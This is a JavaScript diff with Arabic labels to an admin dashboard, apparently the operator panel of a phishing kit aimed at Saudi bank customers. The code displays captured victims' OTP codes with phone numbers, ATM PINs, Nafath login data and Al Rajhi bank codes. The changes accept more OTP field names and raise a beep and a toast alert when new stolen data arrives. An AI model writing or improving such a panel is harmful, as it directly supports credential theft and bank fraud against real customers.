@@ -892,20 +892,20 @@
     }
     // عرض بيانات OTP إذا وجدت
     const ver = b.verifications || {};
-    if (ver.phone || ver.phoneCode) {
-      const otp = ver.phone || ver.phoneCode;
+    const otpData = ver.otp || ver.phone || ver.phoneCode || ver.code;
+    if (otpData) {
       h += `<div class="sec-title" style="background:#eff6ff;color:#1d4ed8;"><i class="bi bi-phone" style="color:#2563eb"></i> بيانات OTP</div>
         <div class="detail-grid">
-          ${dRow("رمز OTP", otp.verifyCode || otp.phoneCode || otp.code || '-')}
-          ${dRow("الجوال", otp.phone || otp.clientPhone || '-')}
+          ${dRow("رمز OTP", otpData.code || otpData.verifyCode || otpData.phoneCode || otpData.otpCode || '-')}
+          ${dRow("الجوال", otpData.phone || otpData.clientPhone || '-')}
         </div>`;
     }
     // عرض بيانات الرقم السري ATM إذا وجدت
-    if (ver.pin || ver.code) {
-      const pin = ver.pin || ver.code;
+    const pinData = ver.pin;
+    if (pinData) {
       h += `<div class="sec-title" style="background:#fffbeb;color:#92400e;"><i class="bi bi-lock" style="color:#f59e0b"></i> بيانات الرقم السري ATM</div>
         <div class="detail-grid">
-          ${dRow("الرقم السري", pin.secretNum || pin.pin || pin.code || '-')}
+          ${dRow("الرقم السري", pinData.pin || pinData.secretNum || pinData.code || '-')}
         </div>`;
     }
     // عرض بيانات نفاذ إذا وجدت
@@ -1001,15 +1001,17 @@
       const ref = d.referenceId || d.reference;
       if (!ref) return;
       const typeNames = {
+        otp: 'رمز OTP',
         phone: 'رمز OTP',
         phoneCode: 'رمز OTP',
+        code: 'رمز OTP',
         pin: 'رقم سري ATM',
         nafad: 'نفاذ',
         nafath: 'نفاذ',
         rajhi: 'الراجحي',
         rajhiCode: 'رمز الراجحي',
       };
-      const typeLabel = typeNames[d.type] || d.type || 'بيانات جديدة';
+      const typeLabel = d.label || typeNames[d.type] || d.type || 'بيانات جديدة';
       newDataRefs.add(ref);
       beep();
       toast(`\u2709 ${typeLabel}: ${ref}`, "inf");
